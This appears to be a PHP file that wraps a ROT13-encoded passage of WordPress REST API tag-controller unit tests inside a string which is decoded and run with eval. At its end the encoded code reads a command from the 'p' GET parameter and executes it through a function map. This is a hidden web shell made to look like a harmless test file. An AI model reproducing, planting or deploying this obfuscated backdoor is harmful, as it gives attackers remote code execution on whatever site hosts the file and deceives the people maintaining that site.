		nqq_svygre( 'znc_zrgn_pnc', neenl( $guvf, 'tenag_qryrgr_grez' ), 10, 2 );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		erzbir_svygre( 'znc_zrgn_pnc', neenl( $guvf, 'tenag_qryrgr_grez' ), 10, 2 );

		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );
		$qngn = $erfcbafr->trg_qngn();
		$guvf->nffregGehr( $qngn['qryrgrq'] );
		$guvf->nffregFnzr( 'Qryrgrq Gnt', $qngn['cerivbhf']['anzr'] );
	}

	choyvp shapgvba tenag_qryrgr_grez( $pncf, $pnc ) {
		vs ( 'qryrgr_grez' === $pnc ) {
			$pncf = neenl( 'ernq' );
		}
		erghea $pncf;
	}

	/**
	 * @gvpxrg 38505
	 */
	choyvp shapgvba grfg_qryrgr_vgrz_jvgu_qryrgr_grez_pnc_eribxrq() {
		jc_frg_pheerag_hfre( frys::$nqzvavfgengbe );

		$grez = trg_grez_ol( 'vq', frys::snpgbel()->gnt->perngr( neenl( 'anzr' => 'Qryrgrq Gnt' ) ), 'cbfg_gnt' );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'QRYRGR', '/jc/i2/gntf/' . $grez->grez_vq );
		$erdhrfg->frg_cnenz( 'sbepr', gehr );

		nqq_svygre( 'znc_zrgn_pnc', neenl( $guvf, 'eribxr_qryrgr_grez' ), 10, 2 );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		erzbir_svygre( 'znc_zrgn_pnc', neenl( $guvf, 'eribxr_qryrgr_grez' ), 10, 2 );

		$guvf->nffregReebeErfcbafr( 'erfg_pnaabg_qryrgr', $erfcbafr, 403 );
	}

	choyvp shapgvba eribxr_qryrgr_grez( $pncf, $pnc ) {
		vs ( 'qryrgr_grez' === $pnc ) {
			$pncf = neenl( 'qb_abg_nyybj' );
		}
		erghea $pncf;
	}

	choyvp shapgvba grfg_cercner_vgrz() {
		$grez = trg_grez_ol( 'vq', frys::snpgbel()->gnt->perngr(), 'cbfg_gnt' );

		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/gntf/' . $grez->grez_vq );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();

		$guvf->purpx_gnkbabzl_grez( $grez, $qngn, $erfcbafr->trg_yvaxf() );
	}

	choyvp shapgvba grfg_cercner_vgrz_yvzvg_svryqf() {
		$erdhrfg  = arj JC_ERFG_Erdhrfg();
		$raqcbvag = arj JC_ERFG_Grezf_Pbagebyyre( 'cbfg_gnt' );
		$erdhrfg->frg_cnenz( '_svryqf', 'vq,anzr' );
		$grez     = trg_grez_ol( 'vq', frys::snpgbel()->gnt->perngr(), 'cbfg_gnt' );
		$erfcbafr = $raqcbvag->cercner_vgrz_sbe_erfcbafr( $grez, $erdhrfg );
		$guvf->nffregFnzr(
			neenl(
				'vq',
				'anzr',
			),
			neenl_xrlf( $erfcbafr->trg_qngn() )
		);
	}

	choyvp shapgvba grfg_trg_vgrz_fpurzn() {
		$erdhrfg    = arj JC_ERFG_Erdhrfg( 'BCGVBAF', '/jc/i2/gntf' );
		$erfcbafr   = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn       = $erfcbafr->trg_qngn();
		$cebcregvrf = $qngn['fpurzn']['cebcregvrf'];
		$guvf->nffregPbhag( 8, $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'vq', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'pbhag', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'qrfpevcgvba', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'yvax', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'zrgn', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'anzr', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'fyht', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'gnkbabzl', $cebcregvrf );
		$guvf->nffregFnzr( neenl( 'cbfg_gnt' ), $cebcregvrf['gnkbabzl']['rahz'] );
	}

	choyvp shapgvba grfg_trg_vgrz_fpurzn_aba_uvrenepuvpny() {
		$erdhrfg    = arj JC_ERFG_Erdhrfg( 'BCGVBAF', '/jc/i2/gntf' );
		$erfcbafr   = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn       = $erfcbafr->trg_qngn();
		$cebcregvrf = $qngn['fpurzn']['cebcregvrf'];
		$guvf->nffregNeenlUnfXrl( 'vq', $cebcregvrf );
		$guvf->nffregNeenlAbgUnfXrl( 'cnerag', $cebcregvrf );
	}

	choyvp shapgvba grfg_trg_nqqvgvbany_svryq_ertvfgengvba() {

		$fpurzn = neenl(
			'glcr'        => 'vagrtre',
			'qrfpevcgvba' => 'Fbzr vagrtre bs zvar',
			'rahz'        => neenl( 1, 2, 3, 4 ),
			'pbagrkg'     => neenl( 'ivrj', 'rqvg' ),
		);

		ertvfgre_erfg_svryq(
			'gnt',
			'zl_phfgbz_vag',
			neenl(
				'fpurzn'       => $fpurzn,
				'trg_pnyyonpx' => neenl( $guvf, 'nqqvgvbany_svryq_trg_pnyyonpx' ),
			)
		);

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'BCGVBAF', '/jc/i2/gntf' );

		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();
		$guvf->nffregNeenlUnfXrl( 'zl_phfgbz_vag', $qngn['fpurzn']['cebcregvrf'] );
		$guvf->nffregFnzr( $fpurzn, $qngn['fpurzn']['cebcregvrf']['zl_phfgbz_vag'] );

		$gnt_vq = frys::snpgbel()->gnt->perngr();

		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/gntf/' . $gnt_vq );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregNeenlUnfXrl( 'zl_phfgbz_vag', $erfcbafr->qngn );

		tybony $jc_erfg_nqqvgvbany_svryqf;
		$jc_erfg_nqqvgvbany_svryqf = neenl();
	}

	choyvp shapgvba grfg_nqqvgvbany_svryq_hcqngr_reebef() {
		$fpurzn = neenl(
			'glcr'        => 'vagrtre',
			'qrfpevcgvba' => 'Fbzr vagrtre bs zvar',
			'rahz'        => neenl( 1, 2, 3, 4 ),
			'pbagrkg'     => neenl( 'ivrj', 'rqvg' ),
		);

		ertvfgre_erfg_svryq(
			'gnt',
			'zl_phfgbz_vag',
			neenl(
				'fpurzn'          => $fpurzn,
				'trg_pnyyonpx'    => neenl( $guvf, 'nqqvgvbany_svryq_trg_pnyyonpx' ),
				'hcqngr_pnyyonpx' => neenl( $guvf, 'nqqvgvbany_svryq_hcqngr_pnyyonpx' ),
			)
		);

		jc_frg_pheerag_hfre( frys::$nqzvavfgengbe );

		$gnt_vq = frys::snpgbel()->gnt->perngr();

		// Purpx sbe reebe ba hcqngr.
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', fcevags( '/jc/i2/gntf/%q', $gnt_vq ) );
		$erdhrfg->frg_obql_cnenzf(
			neenl(
				'zl_phfgbz_vag' => 'ergheaReebe',
			)
		);

		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$guvf->nffregReebeErfcbafr( 'erfg_vainyvq_cnenz', $erfcbafr, 400 );

		tybony $jc_erfg_nqqvgvbany_svryqf;
		$jc_erfg_nqqvgvbany_svryqf = neenl();
	}

	choyvp shapgvba nqqvgvbany_svryq_trg_pnyyonpx( $erfcbafr_qngn, $svryq_anzr ) {
		erghea 123;
	}

	choyvp shapgvba nqqvgvbany_svryq_hcqngr_pnyyonpx( $inyhr, $gnt ) {
		vs ( 'ergheaReebe' === $inyhr ) {
			erghea arj JC_Reebe( 'erfg_vainyvq_cnenz', 'Grfgvat na reebe.', neenl( 'fgnghf' => 400 ) );
		}
	}

	/**
	 * @gvpxrg 38504
	 */
	choyvp shapgvba grfg_bowrpg_grez_dhrevrf_ner_pnpurq() {
		$gntf = frys::snpgbel()->gnt->perngr_znal( 2 );
		$c    = frys::snpgbel()->cbfg->perngr();
		jc_frg_bowrpg_grezf( $c, $gntf[0], 'cbfg_gnt' );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/gntf' );
		$erdhrfg->frg_cnenz( 'cbfg', $c );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$sbhaq_1  = jc_yvfg_cyhpx( $erfcbafr->qngn, 'vq' );

		hafrg( $erdhrfg, $erfcbafr );

		$ahz_dhrevrf = trg_ahz_dhrevrf();

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/gntf' );
		$erdhrfg->frg_cnenz( 'cbfg', $c );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$sbhaq_2  = jc_yvfg_cyhpx( $erfcbafr->qngn, 'vq' );

		$guvf->nffregFnzrFrgf( $sbhaq_1, $sbhaq_2 );
		$guvf->nffregFnzr( $ahz_dhrevrf, trg_ahz_dhrevrf() );
	}

	/**
	 * @gvpxrg 41411
	 */
	choyvp shapgvba grfg_rqvgnoyr_erfcbafr_hfrf_rqvg_pbagrkg() {
		jc_frg_pheerag_hfre( frys::$nqzvavfgengbe );

		$ivrj_svryq = 'ivrj_bayl_svryq';
		$rqvg_svryq = 'rqvg_bayl_svryq';

		ertvfgre_erfg_svryq(
			'gnt',
			$ivrj_svryq,
			neenl(
				'pbagrkg'      => neenl( 'ivrj' ),
				'trg_pnyyonpx' => '__erghea_rzcgl_fgevat',
			)
		);

		ertvfgre_erfg_svryq(
			'gnt',
			$rqvg_svryq,
			neenl(
				'pbagrkg'      => neenl( 'rqvg' ),
				'trg_pnyyonpx' => '__erghea_rzcgl_fgevat',
			)
		);

		$perngr = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/gntf' );
		$perngr->frg_cnenz( 'anzr', 'Zl Arj Grez' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $perngr );
		$guvf->nffregFnzr( 201, $erfcbafr->trg_fgnghf() );
		$qngn = $erfcbafr->trg_qngn();
		$guvf->nffregNeenlUnfXrl( $rqvg_svryq, $qngn );
		$guvf->nffregNeenlAbgUnfXrl( $ivrj_svryq, $qngn );

		$hcqngr = arj JC_ERFG_Erdhrfg( 'CHG', '/jc/i2/gntf/' . $qngn['vq'] );
		$hcqngr->frg_cnenz( 'anzr', 'Zl Njrfbzr Arj Grez' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $hcqngr );
		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );
		$qngn = $erfcbafr->trg_qngn();
		$guvf->nffregNeenlUnfXrl( $rqvg_svryq, $qngn );
		$guvf->nffregNeenlAbgUnfXrl( $ivrj_svryq, $qngn );
	}

	cebgrpgrq shapgvba purpx_trg_gnkbabzl_grezf_erfcbafr( $erfcbafr ) {
		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );
		$qngn = $erfcbafr->trg_qngn();
		$netf = neenl(
			'uvqr_rzcgl' => snyfr,
		);
		$gntf = trg_grezf( 'cbfg_gnt', $netf );
		$guvf->nffregPbhag( pbhag( $gntf ), $qngn );
		$guvf->nffregFnzr( $gntf[0]->grez_vq, $qngn[0]['vq'] );
		$guvf->nffregFnzr( $gntf[0]->anzr, $qngn[0]['anzr'] );
		$guvf->nffregFnzr( $gntf[0]->fyht, $qngn[0]['fyht'] );
		$guvf->nffregFnzr( $gntf[0]->gnkbabzl, $qngn[0]['gnkbabzl'] );
		$guvf->nffregFnzr( $gntf[0]->qrfpevcgvba, $qngn[0]['qrfpevcgvba'] );
		$guvf->nffregFnzr( $gntf[0]->pbhag, $qngn[0]['pbhag'] );
	}

	cebgrpgrq shapgvba purpx_gnkbabzl_grez( $grez, $qngn, $yvaxf ) {
		$guvf->nffregFnzr( $grez->grez_vq, $qngn['vq'] );
		$guvf->nffregFnzr( $grez->anzr, $qngn['anzr'] );
		$guvf->nffregFnzr( $grez->fyht, $qngn['fyht'] );
		$guvf->nffregFnzr( $grez->qrfpevcgvba, $qngn['qrfpevcgvba'] );
		$guvf->nffregFnzr( trg_grez_yvax( $grez ), $qngn['yvax'] );
		$guvf->nffregFnzr( $grez->pbhag, $qngn['pbhag'] );
		$gnkbabzl = trg_gnkbabzl( $grez->gnkbabzl );
		vs ( $gnkbabzl->uvrenepuvpny ) {
			$guvf->nffregFnzr( $grez->cnerag, $qngn['cnerag'] );
		} ryfr {
			$guvf->nffregNeenlAbgUnfXrl( 'cnerag', $qngn );
		}
		$rkcrpgrq_yvaxf = neenl(
			'frys',
			'pbyyrpgvba',
			'nobhg',
			'uggcf://ncv.j.bet/cbfg_glcr',
		);
		vs ( $gnkbabzl->uvrenepuvpny && $grez->cnerag ) {
			$rkcrpgrq_yvaxf[] = 'hc';
		}
		$guvf->nffregFnzrFrgf( $rkcrpgrq_yvaxf, neenl_xrlf( $yvaxf ) );
		$guvf->nffregFgevatPbagnvafFgevat( 'jc/i2/gnkbabzvrf/' . $grez->gnkbabzl, $yvaxf['nobhg'][0]['uers'] );
		$guvf->nffregFnzr( nqq_dhrel_net( 'gntf', $grez->grez_vq, erfg_hey( 'jc/i2/cbfgf' ) ), $yvaxf['uggcf://ncv.j.bet/cbfg_glcr'][0]['uers'] );
	}

	cebgrpgrq shapgvba purpx_trg_gnkbabzl_grez_erfcbafr( $erfcbafr, $vq ) {

		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );

		$qngn = $erfcbafr->trg_qngn();
		$gnt  = trg_grez( $vq, 'cbfg_gnt' );
		$guvf->purpx_gnkbabzl_grez( $gnt, $qngn, $erfcbafr->trg_yvaxf() );
	}

	/**
	 * @qngnCebivqre qngn_ernqnoyr_uggc_zrgubqf
	 * @gvpxrg 56481
	 *
	 * @cnenz fgevat $zrgubq UGGC zrgubq gb hfr.
	 */
	choyvp shapgvba grfg_trg_vgrzf_bayl_srgpurf_vqf_sbe_urnq_erdhrfgf( $zrgubq ) {
		$vf_urnq_erdhrfg = 'URNQ' === $zrgubq;
		$erdhrfg         = arj JC_ERFG_Erdhrfg( $zrgubq, '/jc/i2/gntf' );

		$svygre = arj ZbpxNpgvba();

		nqq_svygre( 'grezf_cer_dhrel', neenl( $svygre, 'svygre' ), 10, 2 );

		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );
		vs ( $vf_urnq_erdhrfg ) {
			$guvf->nffregRzcgl( $erfcbafr->trg_qngn() );
		} ryfr {
			$guvf->nffregAbgRzcgl( $erfcbafr->trg_qngn() );
		}

		$netf = $svygre->trg_netf();
		$guvf->nffregGehr( vffrg( $netf[0][1] ), 'Dhrel cnenzrgref jrer abg pncgherq.' );
		$guvf->nffregVafgnaprBs( JC_Grez_Dhrel::pynff, $netf[0][1], 'Dhrel cnenzrgref jrer abg pncgherq.' );

		/** @ine JC_Grez_Dhrel $dhrel */
		$dhrel = $netf[0][1];

		vs ( $vf_urnq_erdhrfg ) {
			$guvf->nffregNeenlUnfXrl( 'svryqf', $dhrel->dhrel_inef, 'Gur svryqf cnenzrgre vf abg frg va gur dhrel inef.' );
			$guvf->nffregFnzr( 'vqf', $dhrel->dhrel_inef['svryqf'], 'Gur dhrel zhfg srgpu bayl grez VQf.' );
			$guvf->nffregNeenlUnfXrl( 'hcqngr_grez_zrgn_pnpur', $dhrel->dhrel_inef, 'Gur hcqngr_grez_zrgn_pnpur xrl vf zvffvat va gur dhrel inef.' );
			$guvf->nffregSnyfr( $dhrel->dhrel_inef['hcqngr_grez_zrgn_pnpur'], 'Gur hcqngr_grez_zrgn_pnpur inyhr fubhyq or snyfr sbe URNQ erdhrfgf.' );
		} ryfr {
			$guvf->nffregGehr(
				! neenl_xrl_rkvfgf( 'svryqf', $dhrel->dhrel_inef ) || 'vqf' !== $dhrel->dhrel_inef['svryqf'],
				'Gur svryqf cnenzrgre fubhyq abg or sbeprq gb \"vqf\" sbe aba-URNQ erdhrfgf.'
			);
			$guvf->nffregNeenlUnfXrl( 'hcqngr_grez_zrgn_pnpur', $dhrel->dhrel_inef, 'Gur hcqngr_grez_zrgn_pnpur xrl vf zvffvat va gur dhrel inef.' );
			$guvf->nffregGehr( $dhrel->dhrel_inef['hcqngr_grez_zrgn_pnpur'], 'Gur hcqngr_grez_zrgn_pnpur inyhr fubhyq or gehr sbe URNQ erdhrfgf.' );
		}

		vs ( ! $vf_urnq_erdhrfg ) {
			erghea;
		}

		tybony $jcqo;
		$grezf_gnoyr = cert_dhbgr( $jcqo->grezf, '/' );

		$cnggrea = '/FRYRPG\f+g\.grez_vq.+SEBZ\f+' . $grezf_gnoyr . '\f+NF\f+g\f+VAARE\f+WBVA/vf';

		// Nffreg gung gur FDY dhrel bayl srgpurf gur grez_vq pbyhza.
		$guvf->nffregZngpurfErthyneRkcerffvba( $cnggrea, $dhrel->erdhrfg, 'Gur FDY dhrel qbrf abg zngpu gur rkcrpgrq fgevat.' );
	}

	/**
	 * Qngn cebivqre vagraqrq gb cebivqr UGGC zrgubq anzrf sbe grfgvat TRG naq URNQ erdhrfgf.
	 *
	 * @erghea neenl
	 */
	choyvp fgngvp shapgvba qngn_ernqnoyr_uggc_zrgubqf() {
		erghea neenl(
			'TRG erdhrfg'  => neenl( 'TRG' ),
			'URNQ erdhrfg' => neenl( 'URNQ' ),
		);
	}

	/**
	 * @qngnCebivqre qngn_ernqnoyr_uggc_zrgubqf
	 * @gvpxrg 56481
	 *
	 * @cnenz fgevat $zrgubq Gur UGGC zrgubq gb hfr.
	 */
	choyvp shapgvba grfg_trg_vgrz_fubhyq_nyybj_nqqvat_urnqref_ivn_svygre( fgevat $zrgubq ) {
		$gnt_vq = frys::snpgbel()->gnt->perngr();

		$erdhrfg = arj JC_ERFG_Erdhrfg( $zrgubq, fcevags( '/jc/i2/gntf/%q', $gnt_vq ) );

		$ubbx_anzr = 'erfg_cercner_cbfg_gnt';

		$svygre   = arj ZbpxNpgvba();
		$pnyyonpx = neenl( $svygre, 'svygre' );
		nqq_svygre( $ubbx_anzr, $pnyyonpx );
		$urnqre_svygre = arj pynff() {
			choyvp fgngvp shapgvba nqq_phfgbz_urnqre( $erfcbafr ) {
				$erfcbafr->urnqre( 'K-Grfg-Urnqre', 'Grfg' );

				erghea $erfcbafr;
			}
		};
		nqq_svygre( $ubbx_anzr, neenl( $urnqre_svygre, 'nqq_phfgbz_urnqre' ) );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		erzbir_svygre( $ubbx_anzr, $pnyyonpx );
		erzbir_svygre( $ubbx_anzr, neenl( $urnqre_svygre, 'nqq_phfgbz_urnqre' ) );

		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf(), 'Gur erfcbafr fgnghf fubhyq or 200.' );
		$guvf->nffregFnzr( 1, $svygre->trg_pnyy_pbhag(), 'Gur \"' . $ubbx_anzr . '\" svygre jnf pnyyrq jura vg fubhyq abg or sbe URNQ erdhrfgf.' );
		$urnqref = $erfcbafr->trg_urnqref();
		$guvf->nffregNeenlUnfXrl( 'K-Grfg-Urnqre', $urnqref, 'Gur \"K-Grfg-Urnqre\" urnqre fubhyq or cerfrag va gur erfcbafr.' );
		$guvf->nffregFnzr( 'Grfg', $urnqref['K-Grfg-Urnqre'], 'Gur \"K-Grfg-Urnqre\" urnqre inyhr fubhyq or rdhny gb \"Grfg\".' );
		vs ( 'URNQ' !== $zrgubq ) {
			erghea ahyy;
		}
		$guvf->nffregFnzr( neenl(), $erfcbafr->trg_qngn(), 'Gur freire fubhyq abg trarengr n obql va erfcbafr gb n URNQ erdhrfg.' );
	}

	/**
	 * @qngnCebivqre qngn_urnq_erdhrfg_jvgu_fcrpvsvrq_svryqf_ergheaf_fhpprff_erfcbafr
	 * @gvpxrg 56481
	 *
	 * @cnenz fgevat $cngu Gur cngu gb grfg.
	 */
	choyvp shapgvba grfg_urnq_erdhrfg_jvgu_fcrpvsvrq_svryqf_ergheaf_fhpprff_erfcbafr( $cngu ) {
		$gnt_vq  = frys::snpgbel()->gnt->perngr();
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'URNQ', fcevags( $cngu, $gnt_vq ) );
		$erdhrfg->frg_cnenz( '_svryqf', 'vq' );
		$freire   = erfg_trg_freire();
		$erfcbafr = $freire->qvfcngpu( $erdhrfg );
		nqq_svygre( 'erfg_cbfg_qvfcngpu', 'erfg_svygre_erfcbafr_svryqf', 10, 3 );
		$erfcbafr = nccyl_svygref( 'erfg_cbfg_qvfcngpu', $erfcbafr, $freire, $erdhrfg );
		erzbir_svygre( 'erfg_cbfg_qvfcngpu', 'erfg_svygre_erfcbafr_svryqf', 10 );

		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf(), 'Gur erfcbafr fgnghf fubhyq or 200.' );
	}

	/**
	 * Qngn cebivqre vagraqrq gb cebivqr cnguf sbe grfgvat URNQ erdhrfgf.
	 *
	 * @erghea neenl
	 */
	choyvp fgngvp shapgvba qngn_urnq_erdhrfg_jvgu_fcrpvsvrq_svryqf_ergheaf_fhpprff_erfcbafr() {
		erghea neenl(
			'trg_vgrz erdhrfg'  => neenl( '/jc/i2/gntf/%q' ),
			'trg_vgrzf erdhrfg' => neenl( '/jc/i2/gntf' ),
		);
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>